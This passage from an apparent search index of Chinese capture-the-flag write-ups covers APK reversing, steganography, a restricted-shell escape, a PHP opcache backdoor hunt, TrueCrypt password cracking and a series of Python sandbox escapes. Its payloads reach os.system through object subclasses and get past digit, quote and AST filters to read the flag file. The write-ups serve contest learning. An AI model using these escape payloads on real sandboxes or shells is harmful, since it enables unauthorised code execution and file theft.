\u5373\u9010\u5b57\u8282\u5f02\u6216</p> <p>\u5728 MainActivity \u4e2d\u5c06\u4e24\u4e2a\u7ed9\u51fa\u7684\u5b57\u7b26\u4e32\u5f02\u6216\u53ef\u4ee5\u5f97\u5230 aaa{tH1s_1s_n0t_FLAG_ha\\(_\\)} \u662f\u5047 flag</p> <p>\u90a3\u4e48 MainAcvitity \u4e2d\u7684\u5e94\u8be5\u5c31\u662f\u771f flag\uff0c\u5b83\u7684 a \u901a\u8fc7\u8c03\u7528 libcrack-lead.so\uff08apk \u89e3\u538b\u540e\u53ef\u4ee5\u5728 lib \u91cc\u9762\u627e\u5230\uff09\u91cc\u7684\u51fd\u6570\u5f97\u5230</p> <p>\u7528 IDA \u9006\u4e00\u4e0b libcrack-lead.so\uff0c\u53d1\u73b0\uff1a <pre><code>__int64 __fastcall Java_leadroyal_aaa_com_apk04_MainAcvitity_getKeyFromJNI(_JNIEnv *a1)\n{\n  __int64 v2; // [rsp+0h] [rbp-10h]\n\n  v2 = _JNIEnv::NewCharArray(a1, 27);\n  _JNIEnv::SetCharArrayRegion(a1, v2, 0LL, 27LL, &amp;key);\n  return v2;\n}\n</code></pre> \u70b9\u8fdb\u53bb\u770b\u90a3\u4e2a key\uff0c\u6284\u4e0b\u6765\u5f97\u5230 <code>0xf8 0x46 0x22 0xcd 0x47 0x1b 0x28 0xfc 0xfe 0x0b 0x9e 0x2c 0xec 0x96 0x0f 0xbf 0x5d 0x3c 0xa2 0x05 0xd8 0xac 0x1c 0xba 0xfe 0x60 0x37</code></p> <p>\u4e0e\u7ed3\u679c\u9010\u4e2a\u5f02\u6216\uff0c\u5f97\u5230 flag: AAA{youR_now_66666_1ll1^_^}</p>"},{"location":"writeups/AAA/#miaomiaomiao","title":"miaomiaomiao","text":"<p>\u67e5\u770b\u56fe\u7247\u5c5e\u6027\uff0c\u6216\u8005 exiftool \u53ef\u4ee5\u53d1\u73b0 <code>Artist: key:m1a0@888</code> \u6240\u4ee5\u5e94\u8be5\u662f\u5e26\u5bc6\u7801\u7684\u56fe\u7247\u9690\u5199</p> <p>\u5c1d\u8bd5\u4f7f\u7528 steghide\uff0c\u53ef\u4ee5\u89e3\u51fa secret_file.txt\uff0c\u662f\u4e00\u4e32\u4e8c\u8fdb\u5236\uff1a <pre><code>010000010100000101000001011110110100010000110000010111110101100100110000011101010101111101001100001100010110101101100101010111110101001101110100011001010011100101001000001100010110010001100101010111110100110100110001011000010011000001111101\n</code></pre> \u516b\u4f4d\u4e00\u7ec4\u8f6c\u4e3a ASCII \u7801\uff0c\u5f97\u5230 flag: AAA{D0_Y0u_Like_Ste9H1de_M1a0}</p>"},{"location":"writeups/AAA/#jail","title":"Jail","text":"<p>rbash \u63d0\u6743\uff0c\u53ef\u4ee5\u7528 compgen -c \u67e5\u770b\u6240\u6709\u53ef\u7528\u547d\u4ee4</p> <pre><code>ctfuser@jail:~$ BASH_CMDS[a]=/bin/sh;a\n$ /bin/bash\nctfuser@jail:~$ export PATH=$PATH:/bin/\nctfuser@jail:~$ export PATH=$PATH:/usr/bin\nctfuser@jail:~$ ls /\n...\nflag_thisfilename1ss0longt0guess_HAHAHA\n...\nctfuser@jail:~$ cd ../..\nctfuser@jail:/$ ./flag_thisfilename1ss0longt0guess_HAHAHA\nAAA{S0_gOOd_to_FREE_shell!}\n</code></pre> <p>\u76f4\u63a5\u63d0\u6743\u5c31\u53ef\u4ee5\u5f97\u5230 flag: AAA{S0_gOOd_to_FREE_shell!}</p>"},{"location":"writeups/AAA/#find-the-backdoor","title":"find the backdoor","text":"<p>\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a docker \u955c\u50cf\uff0c\u90e8\u7f72\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a Emlog\uff0c\u4e5f\u6ca1\u6709\u641c\u5230\u4ec0\u4e48\u5173\u4e8e Emlog \u7684\u6f0f\u6d1e</p> <p>\u4f46\u662f\u53ef\u4ee5\u53d1\u73b0\uff0c\u955c\u50cf\u91cc\u540c\u65f6\u8fd8\u5305\u542b\u5907\u4efd\u7684 bin \u6587\u4ef6\uff0c\u53ef\u4ee5\u5148\u628a\u5b83\u63d0\u53d6\u51fa\u6765 \u7136\u540e\u518d\u91cd\u65b0\u8fdb\u5165\u7f51\u9875\uff0c\u4f9d\u6b21\u8fdb\u5165\u6240\u6709\u53ef\u80fd\u7684\u7f51\u7ad9\uff0c\u751f\u6210\u65b0\u7684\u4e8c\u8fdb\u5236\u5907\u4efd\u6587\u4ef6</p> <p>\u7136\u540e\u53ef\u4ee5\u901a\u8fc7 opcache_disassembler \u6765\u53cd\u7f16\u8bd1\u8fd9\u4e9b\u6587\u4ef6\uff08\u4f46\u662f\u8fd9\u4e2a\u7684\u4f9d\u8d56\u9700\u8981\u5904\u7406\u4e00\u4e0b\uff0c\u4e0d\u7136\u8dd1\u4e0d\u8d77\u6765\uff0c\u9700\u8981 py2 \u548c\u8001\u7248\u672c\u7684 construct \u6a21\u5757\uff09 <pre><code>import os\ns = os.popen('find /.../find_the_backdoor/back -type f -name \"*.bin\"').read().strip().split('\\n')\ns = [x.strip() for x in s]\nprint(s)\n\nfor x in s:\n    try:\n        # \u539f\u6587\u4ef6\n        ans = os.popen(\n            '/.../py2/bin/python '\n            './analysis_tools/opcache_disassembler.py -n -c -a64 {} &gt; {}'.format(x, x+'.disasm').replace('back/','now/')\n        ).read()\n        # \u65b0\u6587\u4ef6\n        # ans = os.popen('python ./analysis_tools/opcache_disassembler.py -n -c -a64 {} &gt; {}'.format(x, x+'.disasm').replace('backup','now')).read()\n    except Exception as e:\n        print(e)\n</code></pre></p> <p>\u7136\u540e\u53ef\u4ee5\u9010\u6587\u4ef6 diff \u4e24\u4e2a\u6587\u4ef6\u5939\uff0c\u53d1\u73b0\u5f88\u591a\u4e0d\u540c\uff0c\u90fd\u6ca1\u4ec0\u4e48\u610f\u4e49\uff0c\u4f46\u6709\u4e00\u884c\uff1a <pre><code>Only in back/content/templates: pintuer\n</code></pre> \u8bf4\u660e pintuer \u6587\u4ef6\u5939\u53ea\u5728\u539f\u6765\u7684 backup \u91cc\u51fa\u73b0\uff0c\u53bb\u4ed4\u7ec6\u770b\u4e00\u770b \u53d1\u73b0 404.php.bin.disasm \u4e2d\u6709\u4e9b\u7279\u522b\u7684\uff1a <pre><code>#1 DO_FCALL_BY_NAME(None, 'base64_decode');\n#2 DO_FCALL_BY_NAME(None, 'str_rot13');\n#3 SEND_VAL('DHSOr2Iup3ysqQOsFRSQF19ipTAuL2uyK2uOC19kpI9apz91pS8mBQL3BGLjBQO9', None);\n</code></pre> <pre><code>php &gt; echo base64_decode(str_rot13(\"DHSOr2Iup3ysqQOsFRSQF19ipTAuL2uyK2uOC19kpI9apz91pS8mBQL3BGLjBQO9\"));\n</code></pre></p> <p>\u5f97\u5230 flag: AAA{easy_t0_HACK_opcache_hA?_qq_group_386796080}</p>"},{"location":"writeups/AAA/#hegengmings-secret","title":"hegengming's secret","text":"<p>\u9898\u76ee\u8bf4\u88ab Truecrypt \u52a0\u5bc6\u4e86\uff0c\u5e76\u4e14 hint \u91cc\u8bf4 \u201c\u6587\u4ef6\u540d\u4e2d\u6709\u5bc6\u7801\uff0c\u4f46\u6587\u4ef6\u540d\u4e2d\u7684\u7a7a\u683c233333\u201d \u6587\u4ef6\u540d\uff1ahegengming_secret.!xDxxDbfaF XwW8t.truecrypt</p> <p>\u7531\u4e8e\u4e0d\u786e\u5b9a .! \u662f\u5426\u5728\u5bc6\u7801\u91cc\uff0c\u4ee5\u53ca\u7a7a\u683c\u662f\u4ec0\u4e48\u5b57\u7b26\uff0c\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a\u5bc6\u7801\u5b57\u5178\uff0c\u7136\u540e\u4ea4\u7ed9 CnCrypt Passwd \u6765\u7206\u7834\u5bc6\u7801 <pre><code>import string\n\nnow = list(\"xDxxDbfaF XwW8t\")\n\nwith open(\"password.txt\", \"w\") as f:\n    for each in string.printable:\n        now[9] = each\n        f.write(\"\".join(now))\n        f.write(\"\\n\")\n        f.write(\"!\" + \"\".join(now))\n        f.write(\"\\n\")\n        f.write(\".!\" + \"\".join(now))\n        f.write(\"\\n\")\n</code></pre> \u5f97\u5230\u5bc6\u7801 <code>!xDxxDbfaF+XwW8t</code></p> <p>\u4f7f\u7528 TrueCrypt \u89e3\u5bc6\uff0c\u5f97\u5230\u4e00\u4e2a\u78c1\u76d8\uff0c\u91cc\u9762\u6709\u4e24\u4e2a pdf \u6587\u4ef6\uff0c\u4e00\u4e2a docx \u6587\u6863 \u5176\u4e2d docx \u6709\u4e00\u884c\u9690\u85cf\u7684\u5b57\u7b26\u4e32\uff1a<code>893F2yB9MwCn74x1</code>\uff0c\u63a8\u6d4b\u662f\u53e6\u4e00\u4e2a\u5bc6\u7801</p> <p>\u800c TrueCrypt \u6709\u4e00\u4e2a\u5f88\u6709\u8da3\u7684\u529f\u80fd\uff0c\u5c31\u662f\u53ef\u4ee5\u5b58\u5728\u4e00\u4e2a\u9690\u85cf\u5377 \u5982\u679c\u8f93\u5165\u7684\u662f\u666e\u901a\u5bc6\u7801\uff0c\u5219\u6b63\u5e38\u6253\u5f00\u666e\u901a\u5377\uff1b\u5982\u679c\u8f93\u5165\u7684\u662f\u9690\u85cf\u5377\u7684\u5bc6\u7801\uff0c\u5219\u4f1a\u53ea\u6253\u5f00\u9690\u85cf\u5377 \u800c\u4e14\u5bc6\u7801\u4e0d\u4ec5\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e32\u5b57\u7b26\uff0c\u8fd8\u53ef\u4ee5\u52a0\u5165\u4e00\u4e9b keyfiles</p> <p>\u901a\u8fc7\u5c1d\u8bd5\uff0c\u5f97\u5230\u9690\u85cf\u5377\u7684\u5bc6\u7801\u4e3a <code>893F2yB9MwCn74x1</code> \u548c keyfile\uff1a<code>qidanhegengmingliucansecwest2017-170315171957.pdf</code></p> <p>\u5f97\u5230\u4e00\u4e2a 1.9MB \u7684\u9690\u85cf\u5377\uff0c\u91cc\u9762\u53ea\u80fd\u770b\u5230\u4e00\u4e2a txt \u6587\u4ef6\uff0c\u6ca1\u4ec0\u4e48\u7528</p> <p>\u540e\u6765\u95ee\u4e86\u56db\u8001\u5e08\uff0c\u77e5\u9053\u8fd9\u4e2a\u9690\u85cf\u5377\u91cc\u5b9e\u9645\u4e0a\u6709\u4e00\u4e2a\u4ec5\u6709 flag \u7684\u6587\u4ef6\uff0c\u4f46\u662f\u770b\u4e0d\u5230 \u6240\u4ee5\u6211\u5c31\u76f4\u63a5\u8fdb\u5165 DiskGenius \u590d\u5236\u51fa\u4e86\u6574\u4e2a\u78c1\u76d8\uff0c\u7136\u540e\u641c\u7d22\u5f97\u5230\u4e86 flag: AAA{I_hope_life_treats_you_kind_qqgroup_386796080}</p>"},{"location":"writeups/AAA/#jslinux","title":"JSLinux","text":"<p>\u9898\u76ee\u53ea\u7ed9\u4e86 https://bellard.org/jslinux/ \u4e00\u4e2a\u7f51\u5740\uff0c\u8981\u627e\u5230 flag \u4f46\u662f\u8fd9\u662f\u4e00\u4e2a\u522b\u4eba\u516c\u5f00\u7684\u7f51\u7ad9\uff0c\u4e0d\u6e05\u695a\u600e\u4e48\u624d\u80fd\u5728\u91cc\u9762\u85cf\u81ea\u5df1\u7684\u4e1c\u897f hint: \u4e5f\u8bb8\u4f60\u9700\u8981\u4e00\u53f0\u6027\u80fd\u5f3a\u4e00\u70b9\u7684\u7535\u8111+\u597d\u4e00\u70b9\u7684\u7f51\u7edc+\u56de\u5230\u8fc7\u53bb\u7684\u80fd\u529b\uff1b\u8fd9\u4e2a\u9898\u76ee\u4e0d\u7528\u793e\u5de5 \u5927\u6982\u4f1a\u4f7f\u7528\u5230 WebArchive\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u600e\u4e48\u7528\uff0c\u627e\u4e86\u5f53\u65f6\u7684 JSLinux \u7f51\u7ad9\u4e5f\u6ca1\u4ec0\u4e48\u7528</p> <p>\u540e\u6765\u4e5f\u662f\u95ee\u4e86\u56db\u8001\u5e08\u624d\u89e3\u51b3\u7684</p> <p>\u901a\u8fc7 JSLinux \u7f51\u7ad9\u53ef\u4ee5\u53d1\u73b0\u5b83\u5b9e\u9645\u662f\u901a\u8fc7 VFsync \u8fdb\u884c\u5b58\u50a8\u7684\uff0c\u6240\u4ee5\u901a\u8fc7\u5b83\u662f\u53ef\u4ee5\u6709\u767b\u5f55\u529f\u80fd\u7684 \u800c\u4e14\u6839\u636e VFsync \u7684 FAQ\uff0c\u53ef\u4ee5\u77e5\u9053\u5b83\u53ef\u4ee5\u6709\u4e0d\u4f7f\u7528\u5bc6\u7801\u5c31\u516c\u5f00\u5206\u4eab\u7684\u4e1c\u897f\uff0c\u6bd4\u5982\u901a\u8fc7\u8bbf\u95ee https://vfsync.org/u/user/pub \u800c\u4e14\u5df2\u77e5\u51fa\u9898\u4eba\u662f chenyuan</p> <p>\u4f46\u662f\u76f4\u63a5\u8fdb\u5165\u865a\u62df\u673a\u7684\u94fe\u63a5 https://vfsync.org/vm.html?guest_url=https://vfsync.org/u/chenyuan/pub \u88ab\u5220\u6389\u4e86\uff0c\u4e0d\u80fd\u6253\u5f00 \u6240\u4ee5\u901a\u8fc7 WebArchive \u6765\u627e</p> <p>\u8f93\u5165 vfsync.org\uff0c\u67e5\u627e\u8bb0\u5f55\u7684\u6240\u6709 URLs\uff0c\u7136\u540e\u641c\u7d22 chenyuan\uff0c\u53d1\u73b0\u4e00\u4e2a\u4fdd\u5b58\u7684\u94fe\u63a5\uff1ahttps://vfsync.org/u/chenyuan/pub/files/0000000000000001</p> <p>\u5f97\u5230 flag: AAA{vm_in_browser!}</p>"},{"location":"writeups/AAA/#pysandbox","title":"pysandbox \u7cfb\u5217","text":""},{"location":"writeups/AAA/#pysandbox-16","title":"pysandbox 1~6","text":""},{"location":"writeups/AAA/#pysandbox-1","title":"pysandbox 1","text":"<p>\u6709\u6548\u5185\u5bb9\u53ea\u6709\u4e00\u53e5 eval\uff0c\u6240\u4ee5\u57fa\u672c\u4e0a\u6ca1\u6709\u4efb\u4f55\u9650\u5236\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u8bfb\u53d6 flag</p> <ul> <li><code>open(\"/flag\").read()</code></li> <li>\u4f7f\u7528 <code>os.system</code>\uff0c\u4f46 os \u6a21\u5757\u5e76\u672a\u5bfc\u5165\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528 <code>__import__(\"os\").system(\"cat /flag\")</code> \u5148\u5bfc\u5165\u518d\u8c03\u7528 system \u6267\u884c cat \u547d\u4ee4</li> <li>\u2026\u2026\uff08\u540e\u9762\u7684\u505a\u6cd5\u90fd\u9002\u7528\uff09</li> </ul>"},{"location":"writeups/AAA/#pysandbox-24","title":"pysandbox 2~4","text":"<p>\u4ece\u7b2c\u4e8c\u9898\u5f00\u59cb\u52a0\u4e86\u9650\u5236\uff0c2\u30013 \u628a <code>__builtins__</code> \u6e05\u7a7a\u4e86\uff0c4 \u8c03\u7528\u4e86 <code>sys.modules.clear()</code> \u8fd9\u4e9b\u9898\u7684\u73af\u5883\u90fd\u662f python2 \u7248\u672c\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>().__class__.__base__.__subclasses__()</code> \u5f97\u5230 object \u5b50\u7c7b\uff0c\u7136\u540e\u627e\u5230 warnings.catch_warnings\uff0c\u5e76\u4ece\u4e2d\u8bfb\u53d6 os.system\uff1a</p> <p><code>[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == \"catch_warnings\"][0]()._module.linecache.os.system(\"cat /flag\")</code></p>"},{"location":"writeups/AAA/#pysandbox-56","title":"pysandbox 5~6","text":"<p>python \u73af\u5883\u63d0\u5347\u5230\u4e86 3.7 \u7248\u672c\uff0c\u540c\u6837\u6e05\u7a7a\u4e86 <code>__builtins__</code>\uff0c\u8c03\u7528\u4e86 <code>sys.modules.clear()</code></p> <p>\u6240\u4ee5\u53ef\u4ee5\u4ece object \u7684\u5b50\u7c7b\u5bfb\u627e\u5230 os._wrap_close \u7136\u540e\u4ece\u5176 close \u65b9\u6cd5\u8c03\u7528 __globals__ \u83b7\u53d6 os \u6a21\u5757\u4e2d\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u4ece\u800c\u5f97\u5230 system\uff1a</p> <ul> <li><code>[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == \"_wrap_close\"][0].close.__globals__[\"system\"](\"cat flag\")</code></li> </ul> <p>\u6216\u8005\u4e5f\u53ef\u4ee5\u627e\u5230 FileLoader \u7c7b\uff0c\u8c03\u7528\u5176 .get_data \u65b9\u6cd5\uff1a</p> <ul> <li><code>[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == \"FileLoader\"][0].get_data(\"\",\"flag\")</code></li> </ul>"},{"location":"writeups/AAA/#pysandbox-710","title":"pysandbox 7~10","text":"<p>7 \u9898\u8c03\u7528\u4e86 del(os.system) \u5220\u9664\u4e86 os.system 8 \u9898\u8c03\u7528\u4e86 os.__dict__.clear() \u57fa\u672c\u5220\u9664\u4e86 os 9\u300110 \u9898\u5220\u9664\u4e86 __import__ \u65e0\u6cd5\u91cd\u65b0\u5bfc\u5165\u6a21\u5757</p> <p>\u4f46\u662f\u95ee\u9898\u4e0d\u5927\uff0c\u56e0\u4e3a\u8fd9\u5b8c\u5168\u6ca1\u6709\u9650\u5236\u4f4f\u4e0a\u9762\u8bf4\u7684 FileLoader \u7684\u89e3\u6cd5\uff1a</p> <ul> <li><code>[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == \"FileLoader\"][0].get_data(\"\",\"flag\")</code></li> </ul>"},{"location":"writeups/AAA/#pysandbox-1416","title":"pysandbox 14~16","text":"<p>\u5148\u6765\u770b 14 \u5230 16 \u9898\uff0c\u56e0\u4e3a\u4f3c\u4e4e\u611f\u89c9\u8fd9\u4e2a\u987a\u5e8f\u662f\u6b63\u5e38\u7684\u903b\u8f91\uff0c11\uff5e13 \u8fdb\u884c\u4e86\u5176\u4ed6\u7684\u64cd\u4f5c\uff08\u800c\u4e14 11\uff5e13 \u5361\u4e86\u6211\u7684\u65f6\u95f4\u4e5f\u8981\u6bd4 14\uff5e16 \u957f\uff09</p> <p>14 \u9898\u7528\u4e86\u4e0b\u9762\u7684\u4ee3\u7801\u7981\u6b62\u4e86\u8f93\u5165\u4e2d\u51fa\u73b0\u6570\u5b57\uff1a <pre><code>for i in range(0,10):\n    if str(i) in c: raise Exception(\"not allowed\")\n</code></pre></p> <p>15 \u9898\u7528\u4e86\u4e0b\u9762\u4ee3\u7801\u7981\u6b62\u4e86\u8f93\u5165\u4e2d\u51fa\u73b0\u5f15\u53f7\uff0c\u4e5f\u5c31\u7981\u6b62\u4e86\u5b57\u7b26\u4e32\u7684\u51fa\u73b0\uff1a <pre><code>for i in ['\"', \"'\"]:\n    if str(i) in c: raise Exception(\"not allowed\")\n</code></pre></p> <p>\u800c 16 \u9898\u5c06\u5176\u548c\u5728\u4e86\u4e00\u8d77\uff0c\u540c\u65f6\u7981\u6b62\u4e86\u6570\u5b57\u548c\u5b57\u7b26\u4e32 \u6240\u4ee5\u5176\u5b9e\u53ea\u5b8c\u6210 16 \u9898\u5c31\u53ef\u4ee5\u4e86</p>"},{"location":"writeups/AAA/#_3","title":"\u7ed5\u8fc7\u6570\u5b57","text":"<p>\u6784\u9020\u51fa\u6570\u5b57\u6700\u65b9\u4fbf\u7684\u529e\u6cd5\u5c31\u662f\u6bd4\u8f83\u5217\u8868\u4e86\uff0c\u56e0\u4e3a True \u548c False \u662f\u53ef\u4ee5\u5f53\u4f5c1\u548c0\u7684 \u6240\u4ee51\u5c31\u53ef\u4ee5\u7528 <code>[]==[]</code> \u4ee3\u66ff\uff0c\u800c 0 \u5c31\u53ef\u4ee5\u7528 <code>[]&lt;[]</code> \u4ee3\u66ff \u5c06\u5176\u76f8\u52a0\u5c31\u53ef\u4ee5\u7ec4\u5408\u6210\u6570\u5b57\u4e86</p> <p>\u800c\u4e3a\u4e86\u51cf\u5c0f payload \u7684\u957f\u5ea6\uff0c\u53ef\u4ee5\u5c06\u9700\u8981\u7684\u6570\u5b57\u5206\u89e3\u6210\u8d28\u56e0\u6570\u76f8\u4e58\u7684\u5f62\u5f0f <pre><code>def factor(x):\n    res = []\n    for i in range(2, int(math.sqrt(x)) + 1):\n        while not x % i:\n            x /= i\n            res.append(i)\n    if x &gt; 1:\n        res.append(x)\n    return res\n\ndef gen_num(x):\n    res = \"[]==[]\"\n    for i in range(int(x) - 1):\n        res += \"+[]==[]\"\n    return res\n\ndef gen_payload(x):\n    if x == 0:\n        return \"[]&lt;[]\"\n    if x == 1:\n        return \"[]==[]\"\n    res = factor(x)\n    payload = \"\"\n    for ind, i in enumerate(res):\n        if ind == 0:\n            payload = f\"({gen_num(i)})\"\n        else:\n            payload += f\"*({gen_num(i)})\"\n    return payload\n</code></pre></p>"},{"location":"writeups/AAA/#_4","title":"\u7ed5\u8fc7\u5b57\u7b26\u4e32","text":"<p>\u53ef\u4ee5\u5229\u7528 ascii \u7801\u6765\u6784\u9020\u5b57\u7b26\u4e32\uff0c\u4f46\u662f\u5728\u9650\u5236\u8fd9\u4e48\u591a\u7684\u60c5\u51b5\u4e0b\u8fd8\u662f\u6709\u4e9b\u4e0d\u65b9\u4fbf\uff0c\u6240\u4ee5\u53ef\u4ee5\u5e72\u8106\u76f4\u63a5\u4ece\u4e00\u4e2a\u6587\u6863\u5b57\u7b26\u4e32\uff08\u6bd4\u5982 <code>.to_bytes.__doc__</code>\uff09\u4e2d\u901a\u8fc7\u7d22\u5f15\u6765\u8bfb\u53d6\u5b57\u7b26\u3002 <pre><code>doc = \"Return an array of bytes representing an integer.\\n\\n  length\\n    Length of bytes object to use.  An OverflowError is raised if the\\n    integer is not representable with the given number of bytes.\\n  byteorder\\n    The byte order used to represent the integer.  If byteorder is 'big',\\n    the most significant byte is at the beginning of the byte array.  If\\n    byteorder is 'little', the most significant byte is at the end of the\\n    byte array.  To request the native byte order of the host system, use\\n    `sys.byteorder' as the byte order value.\\n  signed\\n    Determines whether two's complement is used to represent the integer.\\n    If signed is False and a negative integer is given, an OverflowError\\n    is raised.\"\n\ndef gen_string(x):\n    payload = \"\"\n    for i in range(len(x)):\n        if i == 0:\n            ind = doc.index(x[i])\n            payload = f\"([]&lt;[]).to_bytes.__doc__[{gen_payload(ind)}]\"\n        else:\n            ind = doc.index(x[i])\n            payload += f\"+([]&lt;[]).to_bytes.__doc__[{gen_payload(ind)}]\"\n    return payload\n</code></pre></p> <p>\u9488\u5bf9 16 \u9898\uff0c\u8fd8\u8981\u518d\u8fdb\u884c\u7f29\u51cf\u624d\u80fd\u8f93\u5165\uff0c\u6839\u636e\u4ee3\u7801\u53ef\u4ee5\u770b\u51fa\u9898\u76ee\u4e3a\u6211\u4eec\u7559\u4e86 <code>T</code> \u548c <code>F</code> \u8868\u793a True \u548c False\uff0c\u6240\u4ee5\u5c31\u4e0d\u5fc5\u4f7f\u7528 []==[] \u548c []&lt;[] \u4e86 \u548c\u524d\u9762\u4e00\u6837\uff0c\u53ef\u4ee5\u83b7\u53d6 os._wrap_close \u7136\u540e\u5f97\u5230 system \u4e3a\u4e86\u65b9\u4fbf\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 os._wrap_close \u5728 ().__class__.__base__.__subclasses__() \u4e2d\u7684\u7d22\u5f15\uff0c\u5f97\u5230\u7684\u662f 127\uff0c\u4e3a\u4e86\u7f29\u51cf\u4ee3\u7801\uff0c\u53ef\u4ee5\u53d8\u6210 128-1 \u7684\u5f62\u5f0f \u7136\u540e\u7528\u4e0b\u9762\u4ee3\u7801\u8c03\u7528\u5c31\u53ef\u4ee5\u83b7\u5f97 payload\uff1a <pre><code>res = f\"().__class__.__base__.__subclasses__()[{gen_payload(128)}-T].close.__globals__[{gen_string('system')}]({gen_string('cat flag')})\\n\"\nprint(res)\n</code></pre> payload\uff1a <pre><code>().__class__.__base__.__subclasses__()[(T+T)*(T+T)*(T+T)*(T+T)*(T+T)*(T+T)*(T+T)-T].close.__globals__[(F).to_bytes.__doc__[(T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T)]+(F).to_bytes.__doc__[(T+T)*(T+T+T+T+T+T+T)]+(F).to_bytes.__doc__[(T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T)]+(F).to_bytes.__doc__[(T+T)]+(F).to_bytes.__doc__[T]+(F).to_bytes.__doc__[(T+T)*(T+T)*(T+T+T)*(T+T+T)*(T+T+T+T+T)]]((F).to_bytes.__doc__[(T+T)*(T+T)*(T+T+T)*(T+T+T+T+T+T+T)]+(F).to_bytes.__doc__[(T+T+T+T+T+T+T)]+(F).to_bytes.__doc__[(T+T)]+(F).to_bytes.__doc__[(T+T)*(T+T+T)]+(F).to_bytes.__doc__[(T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T)]+(F).to_bytes.__doc__[(T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T+T)]+(F).to_bytes.__doc__[(T+T+T+T+T+T+T)]+(F).to_bytes.__doc__[(T+T)*(T+T)*(T+T+T)*(T+T+T)])\n</code></pre></p> <p>\u901a\u8fc7 pwntools \u8f93\u5165\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86</p> <p>From0and1_WeCANBuildTheW0rld \u8fd8\u633a\u4e2d\u4e8c\u76842333</p>"},{"location":"writeups/AAA/#pysandbox-1113","title":"pysandbox 11~13","text":"<p>\u8fd9\u4e09\u9053\u9898\u548c\u524d\u9762\u90fd\u4e0d\u4e00\u6837\uff0c\u56e0\u4e3a\u5b83\u4f7f\u7528\u4e86AST\uff08\u62bd\u8c61\u8bed\u6cd5\u6811\uff09\u6765\u7cbe\u51c6ban\u6389\u67d0\u4e9b\u7528\u6cd5</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5148\u5206\u6790\u4f60\u8f93\u5165\u7684\u8bed\u53e5\u7684\u8bed\u6cd5\uff0c\u5982\u679c\u51fa\u73b0\u4e86\u67d0\u79cd\u8bed\u6cd5\u5c31\u629b\u51fa\u5f02\u5e38\u76f4\u63a5\u65ad\u6389</p>"},{"location":"writeups/AAA/#pysandbox-11","title":"pysandbox 11","text":"\u9898\u76ee\u4ee3\u7801 <pre><code>dbgprint = sys.stdout.write\n\nclass Traversal():\n    def __init__(self, node):\n        self.tisiv(node)\n\n    depth = -1\n    def tisiv(self, nodes):\n        if not isinstance(nodes, list):\n            nodes = [nodes]\n        self.depth += 1\n        for node in nodes:\n            func = getattr(self, 'tisiv_' + node.__class__.__name__, None)\n            if func:\n                dbgprint(\" \"*self.depth + \"tisiv\"[::-1] +\"\\t\"+ node.__class__.__name__+\"\\n\")\n                return func(node)\n        self.depth -= 1\n\n    def tisiv_Call(self, node):\n        self.tisiv(node.func)\n        self.tisiv(node.args)\n        self.tisiv(node.keywords)\n\n    def tisiv_Attribute(self, node):\n        self.tisiv(node.value)\n        self.tisiv(node.attr)\n\n    def tisiv_Import(self, node):\n        raise Exception(\"not allowed\")\n\n    def tisiv_Module(self, node):\n        self.tisiv(node.body)\n\n    def tisiv_BoolOp(self, node):\n        self.tisiv(node.values)\n\n    def tisiv_BinOp(self, node):\n        self.tisiv(node.left)\n        self.tisiv(node.right)\n\n    def tisiv_UnaryOp(self, node):\n        self.tisiv(node.operand)\n\n    def tisiv_Lambda(self, node):\n        self.tisiv(node.body)\n\n    def tisiv_IfExp(self, node):\n        self.tisiv(node.test)\n        self.tisiv(node.body)\n        self.tisiv(node.orelse)\n\n    def tisiv_Dict(self, node):\n        self.tisiv(node.keys)\n        self.tisiv(node.values)\n\n    def tisiv_Set(self, node):\n        self.tisiv(node.elts)\n\n    def tisiv_ListComp(self, node):\n        raise Exception(\"not allowed\")\n        self.tisiv(node.elt)\n        self.tisiv(node.generators)\n\n    def tisiv_SetComp(self, node):\n        self.tisiv(node.elt)\n        self.tisiv(node.generators)\n\n    def tisiv_DictComp(self, node):\n        self.tisiv(node.key)\n        self.tisiv(node.value)\n        self.tisiv(node.generators)\n\n    def tisiv_GeneratorExp(self, node):\n        self.tisiv(node.elt)\n        self.tisiv(node.generators)\n\n    def tisiv_Yield(self, node):\n        self.tisiv(node.value)\n\n    def tisiv_Compare(self, node):\n        self.tisiv(node.left)\n        self.tisiv(node.comparators)\n\n    def tisiv_Repr(self, node):\n        self.tisiv(node.value)\n\n    def tisiv_Subscript(self, node):\n        self.tisiv(node.value)\n        self.tisiv(node.slice)\n\n    def tisiv_List(self, node):\n        self.tisiv(node.elts)\n\n    def tisiv_Tuple(self, node):\n        self.tisiv(node.elts)\n\n    def tisiv_Expr(self, node):\n        self.tisiv(node.value)\n\n    def tisiv_JoinedStr(self, node):\n        self.tisiv(node.values)\n\n    def tisiv_NameConstant(self, node):\n        pass\n\nTraversal(ast.parse(c))\n\nfor i in list(__builtins__.__dict__.keys()):\n    if i not in [\"print\", \"list\", ]:\n        del(__builtins__.__dict__[i])\n\nfor i in list(x().keys()):\n    if i not in [\"x\", \"print\", \"_eval\", \"c\", ]:\n        del(x()[i])\n\nprint(_eval(c))\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u5b83\u5206\u6790\u8bed\u6cd5\u7684\u65f6\u5019\u53ea\u8981\u9047\u5230 ast.Import \u548c ast.ListComp 